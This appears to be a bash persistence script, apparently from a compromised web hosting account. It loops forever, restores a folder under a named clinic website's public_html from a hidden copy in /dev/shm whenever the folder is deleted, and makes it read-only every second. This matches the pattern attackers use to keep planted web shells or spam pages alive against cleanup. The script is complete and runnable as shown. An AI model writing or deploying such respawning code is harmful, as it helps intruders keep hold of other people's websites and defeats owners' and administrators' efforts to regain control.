#!/bin/bash

folder_path="/home/u1042079/public_html/inovglow-klinikspesialisbedahplastik.com/inovglow"
backup_path="/dev/shm"

while true
do
    if [ ! -d "$folder_path" ]; then
        cp -r "$backup_path" "$folder_path"
    fi

    chmod -R 0555 "$folder_path"
    sleep 1
done